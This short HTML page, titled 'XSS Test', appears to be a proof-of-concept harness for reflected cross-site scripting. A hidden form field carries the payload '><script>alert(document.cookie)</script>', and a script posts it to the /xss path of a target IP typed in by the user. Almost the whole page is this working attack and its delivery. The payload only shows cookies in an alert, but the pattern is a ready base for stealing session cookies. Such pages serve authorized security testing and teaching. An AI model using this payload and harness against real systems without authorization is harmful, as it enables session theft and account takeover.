<!DOCTYPE html>
<html>
  <head>
   <title>XSS Test</title>
  </head>
  <body>
    <center>XSS Test
    <div>
      <label>target</label>
      <input type="text" id="targetIp" value="192.168.1.x">
    </div>
    <form name="submitForm" method="POST">
      <input type=hidden name="keyword" value="><script>alert(document.cookie)</script>">
      <input type=hidden name="mode" value="xss1">
      <input type="button" onclick="submitRequest()" value="送信">
    </form>
    <script>
      'use strict'
      let submitRequest = ()=>{
        let targetIp = document.getElementById('targetIp').value
        document.submitForm.action = `http://${targetIp}/xss`
        document.submitForm.submit()
      }
    </script>
  </body>
</html>
